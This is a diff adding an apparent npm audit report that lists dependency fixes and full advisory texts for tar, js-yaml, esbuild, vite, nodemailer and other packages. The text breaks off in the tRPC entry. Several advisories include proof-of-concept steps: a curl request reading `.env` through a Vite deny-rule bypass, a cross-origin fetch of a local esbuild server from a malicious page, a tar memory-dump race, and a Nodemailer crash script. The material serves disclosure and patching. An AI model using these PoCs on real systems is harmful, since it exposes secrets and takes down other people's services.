@@ -1,0 +1,627 @@
+{
+  "actions": [
+    {
+      "action": "update",
+      "resolves": [
+        {
+          "id": 1109463,
+          "path": ".>@tailwindcss/vite>@tailwindcss/oxide>tar",
+          "dev": false,
+          "optional": false,
+          "bundled": false
+        }
+      ],
+      "module": "tar",
+      "target": "7.5.2",
+      "depth": 4
+    },
+    {
+      "action": "update",
+      "resolves": [
+        {
+          "id": 1109802,
+          "path": ".>puppeteer>cosmiconfig>js-yaml",
+          "dev": false,
+          "optional": false,
+          "bundled": false
+        }
+      ],
+      "module": "js-yaml",
+      "target": "4.1.1",
+      "depth": 4
+    },
+    {
+      "action": "update",
+      "resolves": [
+        {
+          "id": 1111093,
+          "path": ".>react-markdown>mdast-util-to-hast",
+          "dev": false,
+          "optional": false,
+          "bundled": false
+        }
+      ],
+      "module": "mdast-util-to-hast",
+      "target": "13.2.1",
+      "depth": 3
+    },
+    {
+      "action": "update",
+      "resolves": [
+        {
+          "id": 1111154,
+          "path": ".>express-validator>validator",
+          "dev": false,
+          "optional": false,
+          "bundled": false
+        }
+      ],
+      "module": "validator",
+      "target": "13.15.26",
+      "depth": 3
+    },
+    {
+      "action": "update",
+      "resolves": [
+        {
+          "id": 1111244,
+          "path": ".>jsonwebtoken>jws",
+          "dev": false,
+          "optional": false,
+          "bundled": false
+        }
+      ],
+      "module": "jws",
+      "target": "3.2.3",
+      "depth": 3
+    },
+    {
+      "action": "review",
+      "module": "quill",
+      "resolves": [
+        {
+          "id": 1098574,
+          "path": ".>react-quill>quill",
+          "dev": false,
+          "bundled": false,
+          "optional": false
+        }
+      ]
+    },
+    {
+      "action": "review",
+      "module": "esbuild",
+      "resolves": [
+        {
+          "id": 1102341,
+          "path": ".>drizzle-kit>@esbuild-kit/esm-loader>@esbuild-kit/core-utils>esbuild",
+          "dev": false,
+          "optional": false,
+          "bundled": false
+        },
+        {
+          "id": 1102341,
+          "path": ".>vitest>vite>esbuild",
+          "dev": false,
+          "optional": false,
+          "bundled": false
+        }
+      ]
+    },
+    {
+      "action": "review",
+      "module": "vite",
+      "resolves": [
+        {
+          "id": 1109131,
+          "path": ".>vitest>vite",
+          "dev": false,
+          "optional": false,
+          "bundled": false
+        },
+        {
+          "id": 1109137,
+          "path": ".>vite",
+          "dev": false,
+          "optional": false,
+          "bundled": false
+        }
+      ]
+    },
+    {
+      "action": "review",
+      "module": "nodemailer",
+      "resolves": [
+        {
+          "id": 1111074,
+          "path": ".>nodemailer",
+          "dev": false,
+          "optional": false,
+          "bundled": false
+        },
+        {
+          "id": 1111548,
+          "path": ".>nodemailer",
+          "dev": false,
+          "optional": false,
+          "bundled": false
+        }
+      ]
+    },
+    {
+      "action": "review",
+      "module": "@trpc/server",
+      "resolves": [
+        {
+          "id": 1111524,
+          "path": ".>@trpc/server",
+          "dev": false,
+          "optional": false,
+          "bundled": false
+        }
+      ]
+    }
+  ],
+  "advisories": {
+    "1098574": {
+      "findings": [
+        {
+          "version": "1.3.7",
+          "paths": []
+        }
+      ],
+      "found_by": null,
+      "deleted": null,
+      "references": "- https://nvd.nist.gov/vuln/detail/CVE-2021-3163\n- https://github.com/quilljs/quill/issues/3273\n- https://github.com/quilljs/quill/issues/3359\n- https://burninatorsec.blogspot.com/2021/04/cve-2021-3163-xss-slab-quill-js.html\n- https://quilljs.com\n- https://github.com/quilljs/quill/issues/3364\n- https://github.com/advisories/GHSA-4943-9vgg-gr5r",
+      "created": "2021-05-10T15:38:12.000Z",
+      "id": 1098574,
+      "npm_advisory_id": null,
+      "overview": "A vulnerability in the HTML editor of Slab Quill allows an attacker to execute arbitrary JavaScript by storing an XSS payload (a crafted `onloadstart` attribute of an IMG element) in a text field. No patch exists and no further releases are planned.\n\nThis CVE is disputed. Researchers have claimed that this issue is not within the product itself, but is intended behavior in a web browser. More information can be found [here](https://github.com/quilljs/quill/issues/3364).",
+      "reported_by": null,
+      "title": "Cross-site Scripting in quill",
+      "metadata": null,
+      "cves": [
+        "CVE-2021-3163"
+      ],
+      "access": "public",
+      "severity": "moderate",
+      "module_name": "quill",
+      "vulnerable_versions": "<=1.3.7",
+      "github_advisory_id": "GHSA-4943-9vgg-gr5r",
+      "recommendation": "None",
+      "patched_versions": "<0.0.0",
+      "updated": "2024-08-09T14:41:51.000Z",
+      "cvss": {
+        "score": 4.2,
+        "vectorString": "CVSS:3.1/AV:N/AC:H/PR:L/UI:N/S:U/C:L/I:L/A:N"
+      },
+      "cwe": [
+        "CWE-79"
+      ],
+      "url": "https://github.com/advisories/GHSA-4943-9vgg-gr5r"
+    },
+    "1102341": {
+      "findings": [
+        {
+          "version": "0.18.20",
+          "paths": []
+        },
+        {
+          "version": "0.21.5",
+          "paths": []
+        }
+      ],
+      "found_by": null,
+      "deleted": null,
+      "references": "- https://github.com/evanw/esbuild/security/advisories/GHSA-67mh-4wv8-2f99\n- https://github.com/evanw/esbuild/commit/de85afd65edec9ebc44a11e245fd9e9a2e99760d\n- https://github.com/advisories/GHSA-67mh-4wv8-2f99",
+      "created": "2025-02-10T17:48:07.000Z",
+      "id": 1102341,
+      "npm_advisory_id": null,
+      "overview": "### Summary\n\nesbuild allows any websites to send any request to the development server and read the response due to default CORS settings.\n\n### Details\n\nesbuild sets `Access-Control-Allow-Origin: *` header to all requests, including the SSE connection, which allows any websites to send any request to the development server and read the response.\n\nhttps://github.com/evanw/esbuild/blob/df815ac27b84f8b34374c9182a93c94718f8a630/pkg/api/serve_other.go#L121\nhttps://github.com/evanw/esbuild/blob/df815ac27b84f8b34374c9182a93c94718f8a630/pkg/api/serve_other.go#L363\n\n**Attack scenario**:\n\n1. The attacker serves a malicious web page (`http://malicious.example.com`).\n1. The user accesses the malicious web page.\n1. The attacker sends a `fetch('http://127.0.0.1:8000/main.js')` request by JS in that malicious web page. This request is normally blocked by same-origin policy, but that's not the case for the reasons above.\n1. The attacker gets the content of `http://127.0.0.1:8000/main.js`.\n\nIn this scenario, I assumed that the attacker knows the URL of the bundle output file name. But the attacker can also get that information by\n\n- Fetching `/index.html`: normally you have a script tag here\n- Fetching `/assets`: it's common to have a `assets` directory when you have JS files and CSS files in a different directory and the directory listing feature tells the attacker the list of files\n- Connecting `/esbuild` SSE endpoint: the SSE endpoint sends the URL path of the changed files when the file is changed (`new EventSource('/esbuild').addEventListener('change', e => console.log(e.type, e.data))`)\n- Fetching URLs in the known file: once the attacker knows one file, the attacker can know the URLs imported from that file\n\nThe scenario above fetches the compiled content, but if the victim has the source map option enabled, the attacker can also get the non-compiled content by fetching the source map file.\n\n### PoC\n\n1. Download [reproduction.zip](https://github.com/user-attachments/files/18561484/reproduction.zip)\n2. Extract it and move to that directory\n1. Run `npm i`\n1. Run `npm run watch`\n1. Run `fetch('http://127.0.0.1:8000/app.js').then(r => r.text()).then(content => console.log(content))` in a different website's dev tools.\n\n![image](https://github.com/user-attachments/assets/08fc2e4d-e1ec-44ca-b0ea-78a73c3c40e9)\n\n### Impact\n\nUsers using the serve feature may get the source code stolen by malicious websites.",
+      "reported_by": null,
+      "title": "esbuild enables any website to send any requests to the development server and read the response",
+      "metadata": null,
+      "cves": [],
+      "access": "public",
+      "severity": "moderate",
+      "module_name": "esbuild",
+      "vulnerable_versions": "<=0.24.2",
+      "github_advisory_id": "GHSA-67mh-4wv8-2f99",
+      "recommendation": "Upgrade to version 0.25.0 or later",
+      "patched_versions": ">=0.25.0",
+      "updated": "2025-02-10T17:48:08.000Z",
+      "cvss": {
+        "score": 5.3,
+        "vectorString": "CVSS:3.1/AV:N/AC:H/PR:N/UI:R/S:U/C:H/I:N/A:N"
+      },
+      "cwe": [
+        "CWE-346"
+      ],
+      "url": "https://github.com/advisories/GHSA-67mh-4wv8-2f99"
+    },
+    "1109131": {
+      "findings": [
+        {
+          "version": "5.4.20",
+          "paths": []
+        }
+      ],
+      "found_by": null,
+      "deleted": null,
+      "references": "- https://github.com/vitejs/vite/security/advisories/GHSA-93m4-6634-74q7\n- https://github.com/vitejs/vite/commit/f479cc57c425ed41ceb434fecebd63931b1ed4ed\n- https://nvd.nist.gov/vuln/detail/CVE-2025-62522\n- https://github.com/advisories/GHSA-93m4-6634-74q7",
+      "created": "2025-10-20T19:54:28.000Z",
+      "id": 1109131,
+      "npm_advisory_id": null,
+      "overview": "### Summary\nFiles denied by [`server.fs.deny`](https://vitejs.dev/config/server-options.html#server-fs-deny) were sent if the URL ended with `\\` when the dev server is running on Windows.\n\n### Impact\nOnly apps that match the following conditions are affected:\n\n- explicitly exposes the Vite dev server to the network (using --host or [`server.host` config option](https://vitejs.dev/config/server-options.html#server-host))\n- running the dev server on Windows\n\n### Details\n`server.fs.deny` can contain patterns matching against files (by default it includes `.env`, `.env.*`, `*.{crt,pem}` as such patterns). These patterns were able to bypass by using a back slash(`\\`). The root cause is that `fs.readFile('/foo.png/')` loads `/foo.png`.\n\n### PoC\n```shell\nnpm create vite@latest\ncd vite-project/\ncat \"secret\" > .env\nnpm install\nnpm run dev\ncurl --request-target /.env\\ http://localhost:5173\n```\n<img width=\"1593\" height=\"616\" alt=\"image\" src=\"https://github.com/user-attachments/assets/36212f4e-1d3c-4686-b16f-16b35ca9e175\" />",
+      "reported_by": null,
+      "title": "vite allows server.fs.deny bypass via backslash on Windows",
+      "metadata": null,
+      "cves": [
+        "CVE-2025-62522"
+      ],
+      "access": "public",
+      "severity": "moderate",
+      "module_name": "vite",
+      "vulnerable_versions": ">=5.2.6 <=5.4.20",
+      "github_advisory_id": "GHSA-93m4-6634-74q7",
+      "recommendation": "Upgrade to version 5.4.21 or later",
+      "patched_versions": ">=5.4.21",
+      "updated": "2025-10-21T14:51:26.000Z",
+      "cvss": {
+        "score": 0,
+        "vectorString": null
+      },
+      "cwe": [
+        "CWE-22"
+      ],
+      "url": "https://github.com/advisories/GHSA-93m4-6634-74q7"
+    },
+    "1109137": {
+      "findings": [
+        {
+          "version": "7.1.9",
+          "paths": []
+        }
+      ],
+      "found_by": null,
+      "deleted": null,
+      "references": "- https://github.com/vitejs/vite/security/advisories/GHSA-93m4-6634-74q7\n- https://github.com/vitejs/vite/commit/f479cc57c425ed41ceb434fecebd63931b1ed4ed\n- https://nvd.nist.gov/vuln/detail/CVE-2025-62522\n- https://github.com/advisories/GHSA-93m4-6634-74q7",
+      "created": "2025-10-20T19:54:28.000Z",
+      "id": 1109137,
+      "npm_advisory_id": null,
+      "overview": "### Summary\nFiles denied by [`server.fs.deny`](https://vitejs.dev/config/server-options.html#server-fs-deny) were sent if the URL ended with `\\` when the dev server is running on Windows.\n\n### Impact\nOnly apps that match the following conditions are affected:\n\n- explicitly exposes the Vite dev server to the network (using --host or [`server.host` config option](https://vitejs.dev/config/server-options.html#server-host))\n- running the dev server on Windows\n\n### Details\n`server.fs.deny` can contain patterns matching against files (by default it includes `.env`, `.env.*`, `*.{crt,pem}` as such patterns). These patterns were able to bypass by using a back slash(`\\`). The root cause is that `fs.readFile('/foo.png/')` loads `/foo.png`.\n\n### PoC\n```shell\nnpm create vite@latest\ncd vite-project/\ncat \"secret\" > .env\nnpm install\nnpm run dev\ncurl --request-target /.env\\ http://localhost:5173\n```\n<img width=\"1593\" height=\"616\" alt=\"image\" src=\"https://github.com/user-attachments/assets/36212f4e-1d3c-4686-b16f-16b35ca9e175\" />",
+      "reported_by": null,
+      "title": "vite allows server.fs.deny bypass via backslash on Windows",
+      "metadata": null,
+      "cves": [
+        "CVE-2025-62522"
+      ],
+      "access": "public",
+      "severity": "moderate",
+      "module_name": "vite",
+      "vulnerable_versions": ">=7.1.0 <=7.1.10",
+      "github_advisory_id": "GHSA-93m4-6634-74q7",
+      "recommendation": "Upgrade to version 7.1.11 or later",
+      "patched_versions": ">=7.1.11",
+      "updated": "2025-10-21T14:51:26.000Z",
+      "cvss": {
+        "score": 0,
+        "vectorString": null
+      },
+      "cwe": [
+        "CWE-22"
+      ],
+      "url": "https://github.com/advisories/GHSA-93m4-6634-74q7"
+    },
+    "1109463": {
+      "findings": [
+        {
+          "version": "7.5.1",
+          "paths": []
+        }
+      ],
+      "found_by": null,
+      "deleted": null,
+      "references": "- https://github.com/isaacs/node-tar/security/advisories/GHSA-29xp-372q-xqph\n- https://github.com/isaacs/node-tar/issues/445\n- https://github.com/isaacs/node-tar/pull/446\n- https://github.com/isaacs/node-tar/commit/5e1a8e638600d3c3a2969b4de6a6ec44fa8d74c9\n- https://nvd.nist.gov/vuln/detail/CVE-2025-64118\n- https://github.com/isaacs/node-tar/commit/5330eb04bc43014f216e5c271b40d5c00d45224d\n- https://github.com/advisories/GHSA-29xp-372q-xqph",
+      "created": "2025-10-30T17:13:17.000Z",
+      "id": 1109463,
+      "npm_advisory_id": null,
+      "overview": "### Summary\n\nUsing `.t` (aka `.list`) with `{ sync: true }` to read tar entry contents returns uninitialized memory contents if tar file was changed on disk to a smaller size while being read.\n\n### Details\n\nSee:\n* https://github.com/isaacs/node-tar/issues/445\n* https://github.com/isaacs/node-tar/pull/446\n* Regression happened in https://github.com/isaacs/node-tar/commit/5330eb04bc43014f216e5c271b40d5c00d45224d\n\n### PoC\n\nA:\n```js\nimport * as tar from 'tar'\nimport fs from 'node:fs'\n\nfs.writeFileSync('tar.test.tmp', Buffer.alloc(1*1024))\n\n// from readme\nconst filesAdded = []\ntar.c(\n  {\n    sync: true,\n    file: 'tar.test.tmp.tar',\n    onWriteEntry(entry) {\n      // initially, it's uppercase and 0o644\n      console.log('adding', entry.path, entry.stat.mode.toString(8))\n      // make all the paths lowercase\n      entry.path = entry.path.toLowerCase()\n      // make the entry executable\n      entry.stat.mode = 0o755\n      // in the archive, it's lowercase and 0o755\n      filesAdded.push([entry.path, entry.stat.mode.toString(8)])\n    },\n  },\n  ['./tar.test.tmp'],\n)\n\nconst a = fs.readFileSync('tar.test.tmp.tar')\n\nfor (let i = 0; ; i++){\n  if (i % 10000 === 0) console.log(i)\n  fs.writeFileSync('tar.test.tmp.tar', a)\n  fs.truncateSync('tar.test.tmp.tar', 600)\n}\n```\n\nB (vulnerable):\n```js\nimport * as tar from 'tar'\nimport * as fs from 'fs'\n\nwhile (true) {\n  fs.readFileSync(import.meta.filename)\n  tar.t({\n    sync: true,\n    file: 'tar.test.tmp.tar',\n    onReadEntry: e => e.on('data', b => {\n      const a = b.filter(x => x)\n      if (a.length > 0) console.log(a.toString())\n    })\n  })\n}\n```\n\nRun A and B in parallel on Node.js 22 or >=25.1.0\n\nDumps `B` memory (wait for some time to observe text data)\n\n### Impact\n\nExposes process memory and could result in e.g. unintentionally (aka attacker-controlled) attempting to process sensitive data rather than tar entry contents. Uninitialized memory can contain unrelated file contents, environment variables, passwords, etc.\n\nTo execute, an attacker must reduce the file size to boundary between a tar header and body block, in the time between when the tar archive file size is read via `stat`, and the time when the tar archive parser reaches the entry that is truncated. If the file is truncated at a different boundary, then the uninitialized data will very likely not be a valid tar entry, causing the parser to treat the entry as a damaged archive (that is, throwing an error in `strict: true` mode, or by default, skipping the entry harmlessly).\n\nThis is conditional on using the `sync: true` option to the `tar.list`/`tar.t` method, and the `7.5.1` version specifically. Earlier versions were not affected.\n\nThis is also conditional to attacker being able to truncate (or induce a truncation/replacement) of a file on disk (e.g. in cache).\n\nIf the tar file is initially larger than the `opt.maxReadSize` (16kb by default), then uninitialized memory is not exposed to user code, and instead the program enters an infinite loop, causing a DoS rather than an information disclosure vulnerability.\n\nBy default, `tar.list` does _not_ process tar archive entry body content. So, this is further conditional on the user code doing something with the tar entry file contents in an `onReadEntry` method which would expose the file contents (for example, attempting to parse them in such a way that the uninitialized data could appear in an error message).\n\nOther methods in this library (`tar.extract`, etc.) are not affected by this vulnerability.",
+      "reported_by": null,
+      "title": "node-tar has a race condition leading to uninitialized memory exposure",
+      "metadata": null,
+      "cves": [
+        "CVE-2025-64118"
+      ],
+      "access": "public",
+      "severity": "moderate",
+      "module_name": "tar",
+      "vulnerable_versions": "=7.5.1",
+      "github_advisory_id": "GHSA-29xp-372q-xqph",
+      "recommendation": "Upgrade to version 7.5.2 or later",
+      "patched_versions": ">=7.5.2",
+      "updated": "2025-10-30T19:53:35.000Z",
+      "cvss": {
+        "score": 0,
+        "vectorString": null
+      },
+      "cwe": [
+        "CWE-362"
+      ],
+      "url": "https://github.com/advisories/GHSA-29xp-372q-xqph"
+    },
+    "1109802": {
+      "findings": [
+        {
+          "version": "4.1.0",
+          "paths": []
+        }
+      ],
+      "found_by": null,
+      "deleted": null,
+      "references": "- https://github.com/nodeca/js-yaml/security/advisories/GHSA-mh29-5h37-fv8m\n- https://nvd.nist.gov/vuln/detail/CVE-2025-64718\n- https://github.com/nodeca/js-yaml/commit/383665ff4248ec2192d1274e934462bb30426879\n- https://github.com/nodeca/js-yaml/commit/5278870a17454fe8621dbd8c445c412529525266\n- https://github.com/advisories/GHSA-mh29-5h37-fv8m",
+      "created": "2025-11-14T14:29:48.000Z",
+      "id": 1109802,
+      "npm_advisory_id": null,
+      "overview": "### Impact\n\nIn js-yaml 4.1.0, 4.0.0, and 3.14.1 and below, it's possible for an attacker to modify the prototype of the result of a parsed yaml document via prototype pollution (`__proto__`). All users who parse untrusted yaml documents may be impacted.\n\n### Patches\n\nProblem is patched in js-yaml 4.1.1 and 3.14.2.\n\n### Workarounds\n\nYou can protect against this kind of attack on the server by using `node --disable-proto=delete` or `deno` (in Deno, pollution protection is on by default).\n\n### References\n\nhttps://cheatsheetseries.owasp.org/cheatsheets/Prototype_Pollution_Prevention_Cheat_Sheet.html",
+      "reported_by": null,
+      "title": "js-yaml has prototype pollution in merge (<<)",
+      "metadata": null,
+      "cves": [
+        "CVE-2025-64718"
+      ],
+      "access": "public",
+      "severity": "moderate",
+      "module_name": "js-yaml",
+      "vulnerable_versions": ">=4.0.0 <4.1.1",
+      "github_advisory_id": "GHSA-mh29-5h37-fv8m",
+      "recommendation": "Upgrade to version 4.1.1 or later",
+      "patched_versions": ">=4.1.1",
+      "updated": "2025-11-17T15:20:44.000Z",
+      "cvss": {
+        "score": 5.3,
+        "vectorString": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:L/A:N"
+      },
+      "cwe": [
+        "CWE-1321"
+      ],
+      "url": "https://github.com/advisories/GHSA-mh29-5h37-fv8m"
+    },
+    "1111074": {
+      "findings": [
+        {
+          "version": "7.0.10",
+          "paths": []
+        }
+      ],
+      "found_by": null,
+      "deleted": null,
+      "references": "- https://github.com/nodemailer/nodemailer/security/advisories/GHSA-rcmh-qjqh-p98v\n- https://github.com/nodemailer/nodemailer/commit/b61b9c0cfd682b6f647754ca338373b68336a150\n- https://github.com/advisories/GHSA-rcmh-qjqh-p98v",
+      "created": "2025-12-01T20:44:25.000Z",
+      "id": 1111074,
+      "npm_advisory_id": null,
+      "overview": "### Summary\nA DoS can occur that immediately halts the system due to the use of an unsafe function.\n\n### Details\nAccording to **RFC 5322**, nested group structures (a group inside another group) are not allowed. Therefore, in lib/addressparser/index.js, the email address parser performs flattening when nested groups appear, since such input is likely to be abnormal. (If the address is valid, it is added as-is.) In other words, the parser flattens all nested groups and inserts them into the final group list.\nHowever, the code implemented for this flattening process can be exploited by malicious input and triggers DoS\n\nRFC 5322 uses a colon (:) to define a group, and commas (,) are used to separate members within a group.\nAt the following location in lib/addressparser/index.js:\n\nhttps://github.com/nodemailer/nodemailer/blob/master/lib/addressparser/index.js#L90\n\nthere is code that performs this flattening. The issue occurs when the email address parser attempts to process the following kind of malicious address header:\n\n```g0: g1: g2: g3: ... gN: victim@example.com;```\n\nBecause no recursion depth limit is enforced, the parser repeatedly invokes itself in the pattern\n`addressparser → _handleAddress → addressparser → ...`\nfor each nested group. As a result, when an attacker sends a header containing many colons, Nodemailer enters infinite recursion, eventually throwing Maximum call stack size exceeded and causing the process to terminate immediately. Due to the structure of this behavior, no authentication is required, and a single request is enough to shut down the service.\n\nThe problematic code section is as follows:\n```js\nif (isGroup) {\n    ...\n    if (data.group.length) {\n        let parsedGroup = addressparser(data.group.join(',')); // <- boom!\n        parsedGroup.forEach(member => {\n            if (member.group) {\n                groupMembers = groupMembers.concat(member.group);\n            } else {\n                groupMembers.push(member);\n            }\n        });\n    }\n}\n```\n`data.group` is expected to contain members separated by commas, but in the attacker’s payload the group contains colon `(:)` tokens. Because of this, the parser repeatedly triggers recursive calls for each colon, proportional to their number.\n\n### PoC\n\n```\nconst nodemailer = require('nodemailer');\n\nfunction buildDeepGroup(depth) {\n  let parts = [];\n  for (let i = 0; i < depth; i++) {\n    parts.push(`g${i}:`);\n  }\n  return parts.join(' ') + ' user@example.com;';\n}\n\nconst DEPTH = 3000; // <- control depth \nconst toHeader = buildDeepGroup(DEPTH);\nconsole.log('to header length:', toHeader.length);\n\nconst transporter = nodemailer.createTransport({\n  streamTransport: true,\n  buffer: true,\n  newline: 'unix'\n});\n\nconsole.log('parsing start');\n\ntransporter.sendMail(\n  {\n    from: 'test@example.com',\n    to: toHeader,\n    subject: 'test',\n    text: 'test'\n  },\n  (err, info) => {\n    if (err) {\n      console.error('error:', err);\n    } else {\n      console.log('finished :', info && info.envelope);\n    }\n  }\n);\n```\nAs a result, when the colon is repeated beyond a certain threshold, the Node.js process terminates immediately.\n\n### Impact\nThe attacker can achieve the following:\n\n1. Force an immediate crash of any server/service that uses Nodemailer\n2. Kill the backend process with a single web request\n3. In environments using PM2/Forever, trigger a continuous restart loop, causing severe resource exhaustion”",
+      "reported_by": null,
+      "title": "Nodemailer’s addressparser is vulnerable to DoS caused by recursive calls",
+      "metadata": null,
+      "cves": [],
+      "access": "public",
+      "severity": "low",
+      "module_name": "nodemailer",
+      "vulnerable_versions": "<=7.0.10",
+      "github_advisory_id": "GHSA-rcmh-qjqh-p98v",
+      "recommendation": "Upgrade to version 7.0.11 or later",
+      "patched_versions": ">=7.0.11",
+      "updated": "2025-12-01T20:44:26.000Z",
+      "cvss": {
+        "score": 0,
+        "vectorString": null
+      },
+      "cwe": [
+        "CWE-703"
+      ],
+      "url": "https://github.com/advisories/GHSA-rcmh-qjqh-p98v"
+    },
+    "1111093": {
+      "findings": [
+        {
+          "version": "13.2.0",
+          "paths": []
+        }
+      ],
+      "found_by": null,
+      "deleted": null,
+      "references": "- https://github.com/syntax-tree/mdast-util-to-hast/security/advisories/GHSA-4fh9-h7wg-q85m\n- https://nvd.nist.gov/vuln/detail/CVE-2025-66400\n- https://github.com/syntax-tree/mdast-util-to-hast/commit/6fc783ae6abdeb798fd5a68e7f3f21411dde7403\n- https://github.com/syntax-tree/mdast-util-to-hast/commit/ab3a79570a1afbfa7efef5d4a0cd9b5caafbc5d7\n- https://github.com/advisories/GHSA-4fh9-h7wg-q85m",
+      "created": "2025-12-02T01:25:46.000Z",
+      "id": 1111093,
+      "npm_advisory_id": null,
+      "overview": "### Impact\n\nMultiple (unprefixed) classnames could be added in markdown source by using character references.\nThis could make rendered user supplied markdown `code` elements appear like the rest of the page.\nThe following markdown:\n\n````markdown\n```js&#x20;xss\n```\n````\n\nWould create `<pre><code class=\"language-js xss\"></code></pre>`\nIf your page then applied `.xss` classes (or listeners in JS), those apply to this element.\nFor more info see <https://github.com/ChALkeR/notes/blob/master/Improper-markup-sanitization.md#unsanitized-class-attribute>\n\n### Patches\n\nThe bug was patched. When using regular semver, run `npm install`. For exact ranges, make sure to use `13.2.1`.\n\n### Workarounds\n\nUpdate.\n\n### References\n\n* bug introduced in https://github.com/syntax-tree/mdast-util-to-hast/commit/6fc783ae6abdeb798fd5a68e7f3f21411dde7403\n* bug fixed in https://github.com/syntax-tree/mdast-util-to-hast/commit/ab3a79570a1afbfa7efef5d4a0cd9b5caafbc5d7",
+      "reported_by": null,
+      "title": "mdast-util-to-hast has unsanitized class attribute",
+      "metadata": null,
+      "cves": [
+        "CVE-2025-66400"
+      ],
+      "access": "public",
+      "severity": "moderate",
+      "module_name": "mdast-util-to-hast",
+      "vulnerable_versions": ">=13.0.0 <13.2.1",
+      "github_advisory_id": "GHSA-4fh9-h7wg-q85m",
+      "recommendation": "Upgrade to version 13.2.1 or later",
+      "patched_versions": ">=13.2.1",
+      "updated": "2025-12-02T01:25:47.000Z",
+      "cvss": {
+        "score": 0,
+        "vectorString": null
+      },
+      "cwe": [
+        "CWE-20",
+        "CWE-915"
+      ],
+      "url": "https://github.com/advisories/GHSA-4fh9-h7wg-q85m"
+    },
+    "1111154": {
+      "findings": [
+        {
+          "version": "13.15.20",
+          "paths": []
+        }
+      ],
+      "found_by": null,
+      "deleted": null,
+      "references": "- https://nvd.nist.gov/vuln/detail/CVE-2025-12758\n- https://github.com/validatorjs/validator.js/pull/2616\n- https://gist.github.com/koral--/ad31208b25b9e3d1e2e35f1d4d72572e\n- https://security.snyk.io/vuln/SNYK-JS-VALIDATOR-13653476\n- https://github.com/validatorjs/validator.js/commit/d457ecaf55b0f3d8bd379d82757425d0d13dd382\n- https://github.com/advisories/GHSA-vghf-hv5q-vc2g",
+      "created": "2025-11-27T06:31:25.000Z",
+      "id": 1111154,
+      "npm_advisory_id": null,
+      "overview": "Versions of the package validator before 13.15.22 are vulnerable to Incomplete Filtering of One or More Instances of Special Elements in the isLength() function that does not take into account Unicode variation selectors (\\uFE0F, \\uFE0E) appearing in a sequence which lead to improper string length calculation. This can lead to an application using isLength for input validation accepting strings significantly longer than intended, resulting in issues like data truncation in databases, buffer overflows in other system components, or denial-of-service.",
+      "reported_by": null,
+      "title": "Validator is Vulnerable to Incomplete Filtering of One or More Instances of Special Elements",
+      "metadata": null,
+      "cves": [
+        "CVE-2025-12758"
+      ],
+      "access": "public",
+      "severity": "high",
+      "module_name": "validator",
+      "vulnerable_versions": "<13.15.22",
+      "github_advisory_id": "GHSA-vghf-hv5q-vc2g",
+      "recommendation": "Upgrade to version 13.15.22 or later",
+      "patched_versions": ">=13.15.22",
+      "updated": "2025-12-02T16:51:43.000Z",
+      "cvss": {
+        "score": 7.5,
+        "vectorString": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H"
+      },
+      "cwe": [
+        "CWE-792"
+      ],
+      "url": "https://github.com/advisories/GHSA-vghf-hv5q-vc2g"
+    },
+    "1111244": {
+      "findings": [
+        {
+          "version": "3.2.2",
+          "paths": []
+        }
+      ],
+      "found_by": null,
+      "deleted": null,
+      "references": "- https://github.com/auth0/node-jws/security/advisories/GHSA-869p-cjfg-cm3x\n- https://github.com/auth0/node-jws/commit/34c45b2c04434f925b638de6a061de9339c0ea2e\n- https://github.com/auth0/node-jws/commit/4f6e73f24df42f07d632dec6431ade8eda8d11a6\n- https://github.com/auth0/node-jws/releases/tag/v3.2.3\n- https://github.com/auth0/node-jws/releases/tag/v4.0.1\n- https://nvd.nist.gov/vuln/detail/CVE-2025-65945\n- https://github.com/advisories/GHSA-869p-cjfg-cm3x",
+      "created": "2025-12-04T16:54:15.000Z",
+      "id": 1111244,
+      "npm_advisory_id": null,
+      "overview": "### Overview\nAn improper signature verification vulnerability exists when using auth0/node-jws with the HS256 algorithm under specific conditions.\n\n### Am I Affected?\nYou are affected by this vulnerability if you meet all of the following preconditions:\n\n1. Application uses the auth0/node-jws implementation of JSON Web Signatures, versions <=3.2.2 || 4.0.0\n2. Application uses the jws.createVerify() function for HMAC algorithms\n3. Application uses user-provided data from the JSON Web Signature Protected Header or Payload in the HMAC secret lookup routines\n\nYou are NOT affected by this vulnerability if you meet any of the following preconditions:\n1. Application uses the jws.verify() interface (note: `auth0/node-jsonwebtoken` users fall into this category and are therefore NOT affected by this vulnerability)\n2. Application uses only asymmetric algorithms (e.g. RS256)\n3. Application doesn’t use user-provided data from the JSON Web Signature Protected Header or Payload in the HMAC secret lookup routines\n\n### Fix\nUpgrade auth0/node-jws version to version 3.2.3 or 4.0.1\n\n### Acknowledgement\nOkta would like to thank Félix Charette for discovering this vulnerability.",
+      "reported_by": null,
+      "title": "auth0/node-jws Improperly Verifies HMAC Signature",
+      "metadata": null,
+      "cves": [
+        "CVE-2025-65945"
+      ],
+      "access": "public",
+      "severity": "high",
+      "module_name": "jws",
+      "vulnerable_versions": "<3.2.3",
+      "github_advisory_id": "GHSA-869p-cjfg-cm3x",
+      "recommendation": "Upgrade to version 3.2.3 or later",
+      "patched_versions": ">=3.2.3",
+      "updated": "2025-12-04T22:50:04.000Z",
+      "cvss": {
+        "score": 7.5,
+        "vectorString": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:H/A:N"
+      },
+      "cwe": [
+        "CWE-347"
+      ],
+      "url": "https://github.com/advisories/GHSA-869p-cjfg-cm3x"
+    },
+    "1111524": {
+      "findings": [
+        {
+          "version": "11.6.0",
+          "paths": []
+        }
+      ],
+      "found_by": null,
+      "deleted": null,
+      "references": "- https://github.com/trpc/trpc/security/advisories/GHSA-43p4-m455-4f4j\n- https://nvd.nist.gov/vuln/detail/CVE-2025-68130\n- https://github.com/trpc/trpc/commit/78629d524968ef8db5a7adf68d8b95a44369d77e\n- https://github.com/advisories/GHSA-43p4-m455-4f4j",
+      "created": "2025-12-16T19:37:57.000Z",
+      "id": 1111524,
+      "npm_advisory_id": null,
